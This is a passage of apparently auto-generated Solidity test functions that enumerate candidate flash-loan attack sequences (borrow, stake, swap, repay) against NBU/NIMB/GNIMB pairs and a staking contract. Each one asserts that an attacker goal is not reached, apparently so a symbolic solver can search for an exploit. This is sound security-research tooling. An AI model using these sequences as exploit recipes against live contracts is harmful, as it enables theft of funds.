        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1865(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1866(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1867(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1868(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1869(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1870(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1871(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1872(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1873(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1874(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1875(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1876(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1877(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1878(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1879(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1880(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1881(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1882(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1883(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1884(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1885(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1886(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1887(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1888(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1889(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1890(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1891(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1892(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1893(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1894(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1895(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1896(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1897(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1898(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1899(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1900(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1901(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbugnimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1902(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1903(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1904(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1905(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1906(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1907(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1908(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1909(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1910(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1911(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1912(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1913(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1914(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1915(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1916(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
